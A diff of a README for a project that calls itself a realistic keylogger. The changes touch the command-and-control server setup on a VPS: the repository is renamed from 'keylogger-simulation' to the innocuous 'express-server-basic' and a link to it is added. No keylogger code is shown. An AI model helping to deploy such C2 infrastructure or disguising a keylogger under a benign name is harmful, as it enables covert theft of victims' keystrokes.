@@ -40,6 +40,7 @@ This project demonstrates a realistic keylogger that:
 ## 1. Server Setup (Command & Control)
 
 You can run the server on a **Linode VPS** (realistic infrastructure) or on your any preferred VPS for testing.
+Visit https://github.com/nickrar/express-server-basic for more details
 
 ### 1.1 Linode VPS
 
@@ -50,15 +51,15 @@ You can run the server on a **Linode VPS** (realistic infrastructure) or on your
 ssh root@<your_linode_ip>
 
 # Clone the repository
-git clone https://github.com/nickrar/keylogger-simulation.git
-cd keylogger-simulation
+git clone https://github.com/nickrar/express-server-basic.git
+cd express-server-basic
 
 # Run the automatic setup script (installs Node.js, npm, dependencies, reboots)
 python3 setup.py
 
 # After reboot, SSH again and start the server
 ssh root@<your_linode_ip>
-cd keylogger-simulation
+cd express-server-basic
 node server.js
 ```
 
